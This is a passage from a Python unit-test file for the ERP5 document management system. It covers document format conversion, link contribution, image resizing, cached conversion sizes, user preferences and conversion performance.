      'TEST-text-iso8859-1.txt'
    )

  def test_PDF_conversion_to_base_format_no_original_format_access(self):
    """Checks Document.PDFDocument"""
    self._test_document_conversion_to_base_format_no_original_format_access(
      'PDF',
      'TEST-en-002.pdf'
    )

  def test_Text_conversion_to_base_format_no_original_format_access(self):
    """Checks Document.OOoDocument"""
    self._test_document_conversion_to_base_format_no_original_format_access(
      'Text',
      'TEST-en-002.odt'
    )

  def test_Image_conversion_to_base_format_no_original_format_access(self):
    """Checks Document.Image"""
    self._test_document_conversion_to_base_format_no_original_format_access(
      'Image',
      'TEST-en-002.png'
    )

  def test_getExtensibleContent(self):
    """
      Test extensible content of some DMS types. As this is possible only on URL traversal use publish.
    """
    # Create document with good content
    document = self.portal.document_module.newContent(portal_type='Presentation')
    upload_file = makeFileUpload('TEST-en-003.odp')
    document.edit(file=upload_file)
    self.stepTic()
    self.assertEquals('converted', document.getExternalProcessingState())
    for object_url in ('img1.html', 'img2.html', 'text1.html', 'text2.html'):
      response = self.publish('%s/%s' %(document.getPath(), object_url),
                              basic='ERP5TypeTestCase:')
      self.assertTrue('Status: 200 OK' in response.getOutput())
      # OOod produced HTML navigation, test it
      self.assertTrue('First page' in response.getBody())
      self.assertTrue('Back' in response.getBody())
      self.assertTrue('Continue' in response.getBody())
      self.assertTrue('Last page' in response.getBody())

  def test_contributeLink(self):
    """
      Test contributing a link.
    """
    portal = self.portal
    kw = {'url':portal.absolute_url()}
    web_page_1 = portal.Base_contribute(**kw)
    self.stepTic()
    self.assertTrue(web_page_1.getRevision()=='2')
    
    web_page_2 = portal.Base_contribute(**kw)
    self.stepTic()
    self.assertTrue(web_page_1==web_page_2)
    self.assertTrue(web_page_2.getRevision()=='3')

    web_page_3 = portal.Base_contribute(**kw)
    self.stepTic()
    self.assertTrue(web_page_2==web_page_3)
    self.assertTrue(web_page_3.getRevision()=='4')

    # test in synchronous mode
    kw['synchronous_metadata_discovery']=True
    web_page_4 = portal.Base_contribute(**kw)
    self.stepTic()
    self.assertTrue(web_page_3==web_page_4)
    self.assertTrue(web_page_4.getRevision()=='5')

    web_page_5 = portal.Base_contribute(**kw)
    self.stepTic()
    self.assertTrue(web_page_4==web_page_5)
    self.assertTrue(web_page_5.getRevision()=='6')

    web_page_6 = portal.Base_contribute(**kw)
    self.stepTic()
    self.assertTrue(web_page_5==web_page_6)
    self.assertTrue(web_page_6.getRevision()=='7')

    # test contribute link is a safe html (duplicates parts of test_safeHTML_conversion)
    web_page_6_entire_html = web_page_6.asEntireHTML()
    self.assertTrue('<script' not in web_page_6_entire_html)
    self.assertTrue('<javascript' not in web_page_6_entire_html)

  def test_getTargetFormatItemList(self):
    """
     Test getting target conversion format item list.
     Note: this tests assumes the default formats do exists for some content types.
     as this is a matter of respective oinfiguration of mimetypes_registry & portal_transforms
     only the basic minium of transorm to formats is tested.
    """
    portal_type = 'PDF'
    module = self.portal.getDefaultModule(portal_type)

    upload_file = makeFileUpload('TEST.Large.Document.pdf')
    pdf = module.newContent(portal_type=portal_type, file=upload_file)
    
    self.assertTrue('html' in pdf.getTargetFormatList())
    self.assertTrue('png' in pdf.getTargetFormatList())
    self.assertTrue('txt' in pdf.getTargetFormatList())

    web_page=self.portal.web_page_module.newContent(portal_type='Web Page',
                                                    content_type='text/html')
    self.assertTrue('odt' in web_page.getTargetFormatList())
    self.assertTrue('txt' in web_page.getTargetFormatList())

    image=self.portal.image_module.newContent(portal_type='Image',
                                                    content_type='image/png')
    self.assertTrue('txt' in image.getTargetFormatList())

  def test_convertToImageOnTraversal(self):
    """
    Test converting to image all Document portal types on traversal i.e.:
     - image_module/1?quality=100&display=xlarge&format=jpeg
     - document_module/1?quality=100&display=large&format=jpeg
     - document_module/1?quality=10&display=large&format=jpeg
     - document_module/1?display=large&format=jpeg
     - etc ...
    """
    # Create OOo document
    ooo_document = self.portal.document_module.newContent(portal_type='Presentation')
    upload_file = makeFileUpload('TEST-en-003.odp')
    ooo_document.edit(file=upload_file)

    pdf_document = self.portal.document_module.newContent(portal_type='PDF')
    upload_file = makeFileUpload('TEST-en-002.pdf')
    pdf_document.edit(file=upload_file)

    image_document = self.portal.image_module.newContent(portal_type='Image')
    upload_file = makeFileUpload('TEST-en-002.png')
    image_document.edit(file=upload_file)
    self.stepTic()

    def getPreferences(image_display):
      preference_tool = self.portal.getPortalObject().portal_preferences
      height_preference = 'preferred_%s_image_height' % (image_display,)
      width_preference = 'preferred_%s_image_width' % (image_display,)
      height = int(preference_tool.getPreference(height_preference))
      width = int(preference_tool.getPreference(width_preference))
      return (width, height)

    def getURLSizeList(uri, **kw):
      # __ac=RVJQNVR5cGVUZXN0Q2FzZTo%3D is encoded ERP5TypeTestCase with empty password
      url = '%s?%s&__ac=%s' %(uri, urllib.urlencode(kw), 'RVJQNVR5cGVUZXN0Q2FzZTo%3D')
      format=kw.get('format', 'jpeg')
      infile = urllib.urlopen(url)
      # save as file with proper incl. format filename (for some reasons PIL uses this info)
      filename = "%s%stest-image-format-resize.%s" %(os.getcwd(), os.sep, format)
      f = open(filename, "w")
      image_data = infile.read()
      f.write(image_data)
      f.close()
      infile.close()
      file_size = len(image_data)
      image = Image.open(filename)
      image_size = image.size
      os.remove(filename)
      return image_size, file_size

    ooo_document_url = '%s/%s' %(self.portal.absolute_url(), ooo_document.getRelativeUrl())
    pdf_document_url = '%s/%s' %(self.portal.absolute_url(), pdf_document.getRelativeUrl())
    image_document_url = '%s/%s' %(self.portal.absolute_url(), image_document.getRelativeUrl())
    for display in ('nano', 'micro', 'thumbnail', 'xsmall', 'small', 'medium', 'large', 'xlarge',):
      max_tollerance_px = 1
      preffered_size_for_display = getPreferences(display)
      for format in ('png', 'jpeg', 'gif',):
        convert_kw = {'display':display, \
                      'format':format, \
                      'quality':100}
        # Note: due to some image interpolations it's possssible that we have a difference of max_tollerance_px 
        # so allow some tollerance which is produced by respective portal_transform command

        # any OOo based portal type
        ooo_document_image_size, ooo_document_file_size = getURLSizeList(ooo_document_url, **convert_kw)
        self.assertTrue(max(preffered_size_for_display) - max(ooo_document_image_size) <= max_tollerance_px)

        # PDF
        pdf_document_image_size, pdf_document_file_size = getURLSizeList(pdf_document_url, **convert_kw)
        self.assertTrue(max(preffered_size_for_display) - max(pdf_document_image_size) <= max_tollerance_px)

        # Image
        image_document_image_size, image_document_file_size = getURLSizeList(image_document_url, **convert_kw)
        self.assertTrue(max(preffered_size_for_display) - max(image_document_image_size) <= max_tollerance_px)

    # test changing image quality will decrease its file size
    for url in (image_document_url, pdf_document_url, ooo_document_url):
      convert_kw = {'display':'xlarge', \
                    'format':'jpeg', \
                    'quality':100}
      image_document_image_size_100p,image_document_file_size_100p = getURLSizeList(url, **convert_kw)
      # decrease in quality should decrease its file size
      convert_kw['quality'] = 5.0
      image_document_image_size_5p,image_document_file_size_5p = getURLSizeList(url, **convert_kw)
      # removing quality should enable defaults settings which should be reasonable between 5% and 100%
      del convert_kw['quality']
      image_document_image_size_no_quality,image_document_file_size_no_quality = getURLSizeList(url, **convert_kw)
      # check file sizes
      self.assertTrue(image_document_file_size_100p > image_document_file_size_no_quality and \
                      image_document_file_size_no_quality > image_document_file_size_5p)
      # no matter of quality image sizes whould be the same
      self.assertTrue(image_document_image_size_100p==image_document_image_size_5p and \
                        image_document_image_size_5p==image_document_image_size_no_quality)

  def test_checkConversionFormatPermission(self):
    """
     Test various use cases when conversion can be not allowed
    """
    portal_type = 'PDF'
    module = self.portal.getDefaultModule(portal_type)
    upload_file = makeFileUpload('TEST.Large.Document.pdf')
    pdf = module.newContent(portal_type=portal_type, file=upload_file)

    # if PDF size is larger than A4 format system should deny conversion
    self.assertRaises(Unauthorized, pdf.convert, format='jpeg')

  def test_getSearchText(self):
    """
     Test extracting search text script.
    """
    request = get_request()
    portal = self.portal

    # test direct passing argument_name_list
    request.set('MySearchableText', 'MySearchableText_value')
    self.assertEqual(request.get('MySearchableText'),
                     portal.Base_getSearchText(argument_name_list=['MySearchableText']))

    # simulate script being called in a listbox
    # to simulate this we set 'global_search_column' a listbox
    form = portal.DocumentModule_viewDocumentList
    listbox = form.listbox
    listbox.manage_edit_surcharged_xmlrpc(dict(
            global_search_column='advanced_search_text'))
    # render listbox
    listbox.render()
    request.set('advanced_search_text', 'advanced_search_text_value')
    self.assertEqual(request.get('advanced_search_text'),
                     portal.Base_getSearchText())

class TestDocumentWithSecurity(TestDocumentMixin):

  username = 'yusei'

  def getTitle(self):
    return "DMS with security"

  def login(self):
    uf = self.getPortal().acl_users
    uf._doAddUser(self.username, '', ['Auditor', 'Author'], [])
    user = uf.getUserById(self.username).__of__(uf)
    newSecurityManager(None, user)

  def test_ShowPreviewAfterSubmitted(self):
    """
    Make sure that uploader can preview document after submitted.
    """
    filename = 'REF-en-001.odt'
    upload_file = makeFileUpload(filename)
    document = self.portal.portal_contributions.newContent(file=upload_file)

    transaction.commit()
    self.tic()

    document.submit()

    preview_html = document.Document_getPreviewAsHTML().replace('\n', ' ')

    transaction.commit()
    self.tic()

    self.assert_('I use reference to look up TEST' in preview_html)

  def test_DownloadableDocumentSize(self):
    '''Check that once the document is converted and cached, its size is
    correctly set'''
    portal = self.getPortalObject()
    portal_type = 'Text'
    document_module = portal.getDefaultModule(portal_type)

    # create a text document in document module
    text_document = document_module.newContent(portal_type=portal_type,
                                               reference='Foo_001',
                                               title='Foo_OO1')
    f = makeFileUpload('Foo_001.odt')
    text_document.edit(file=f.read())
    f.close()
    transaction.commit()
    self.tic()

    # the document should be automatically converted to html
    self.assertEquals(text_document.getExternalProcessingState(), 'converted')

    # check there is nothing in the cache for pdf conversion
    self.assertFalse(text_document.hasConversion(format='pdf'))

    # call pdf conversion, in this way, the result should be cached
    mime_type, pdf_data = text_document.convert(format='pdf')
    pdf_size = len(pdf_data)


    # check there is a cache entry for pdf conversion of this document
    self.assertTrue(text_document.hasConversion(format='pdf'))

    # check the size of the pdf conversion
    self.assertEquals(text_document.getConversionSize(format='pdf'), pdf_size)

  def test_ImageSizePreference(self):
    """
    Tests that when user defines image sizes are already defined in preferences
    those properties are taken into account when the user
    views an image
    """
    ERP5TypeTestCase.login(self, 'yusei')
    preference_tool = self.portal.portal_preferences
    #get the thumbnail sizes defined by default on default site preference
    default_thumbnail_image_height = \
       preference_tool.default_site_preference.getPreferredThumbnailImageHeight()
    default_thumbnail_image_width = \
       preference_tool.default_site_preference.getPreferredThumbnailImageWidth()
    self.assertTrue(default_thumbnail_image_height > 0)
    self.assertTrue(default_thumbnail_image_width > 0)    
    self.assertEqual(default_thumbnail_image_height,
                     preference_tool.getPreferredThumbnailImageHeight())
    self.assertEqual(default_thumbnail_image_width,
                     preference_tool.getPreferredThumbnailImageWidth())
    #create new user preference and set new sizes for image thumbnail display 
    user_pref = preference_tool.newContent(
                          portal_type='Preference',
                          priority=Priority.USER)
    self.portal.portal_workflow.doActionFor(user_pref, 'enable_action')
    self.assertEqual(user_pref.getPreferenceState(), 'enabled')
    transaction.commit()
    self.tic()
    user_pref.setPreferredThumbnailImageHeight(default_thumbnail_image_height + 10)
    user_pref.setPreferredThumbnailImageWidth(default_thumbnail_image_width + 10)
    #Verify that the new values defined are the ones used by default
    self.assertEqual(default_thumbnail_image_height + 10,
                     preference_tool.getPreferredThumbnailImageHeight())
    self.assertEqual(default_thumbnail_image_height + 10,
                     preference_tool.getPreferredThumbnailImageHeight(0))
    self.assertEqual(default_thumbnail_image_width + 10,
                     preference_tool.getPreferredThumbnailImageWidth())
    self.assertEqual(default_thumbnail_image_width + 10,
                     preference_tool.getPreferredThumbnailImageWidth(0))
    #Now lets check that when we try to view an image as thumbnail, 
    #the sizes of that image are the ones defined in user preference
    image_portal_type = 'Image'
    image_module = self.portal.getDefaultModule(image_portal_type)
    image = image_module.newContent(portal_type=image_portal_type)
    self.assertEqual('thumbnail',
       image.Image_view._getOb("image_view", None).get_value('image_display'))
    self.assertEqual((user_pref.getPreferredThumbnailImageWidth(),
                    user_pref.getPreferredThumbnailImageHeight()),
                     image.getSizeFromImageDisplay('thumbnail'))

class TestDocumentPerformance(TestDocumentMixin):

  def test_01_LargeOOoDocumentToImageConversion(self):
    """
      Test large OOoDocument to image conversion
    """
    ooo_document = self.portal.document_module.newContent(portal_type='Spreadsheet')
    upload_file = makeFileUpload('import_big_spreadsheet.ods')
    ooo_document.edit(file=upload_file)
    self.stepTic()
    before = time.time()
    # converting any OOoDocument -> PDF -> Image
    # make sure that this can happen in less tan XXX seconds i.e. code doing convert
    # uses only first PDF frame (not entire PDF) to make an image - i.e.optimized enough to not kill 
    # entire system performance by doing extensive calculations over entire PDF (see r37102-37103)
    ooo_document.convert(format='png')
    after = time.time()
    req_time = (after - before)
    # we should have image converted in less than 20s
    self.assertTrue(req_time < 20.0)
    
def test_suite():
  suite = unittest.TestSuite()
  suite.addTest(unittest.makeSuite(TestDocument))
  suite.addTest(unittest.makeSuite(TestDocumentWithSecurity))
  suite.addTest(unittest.makeSuite(TestDocumentPerformance))
  return suite


# vim: syntax=python shiftwidth=2
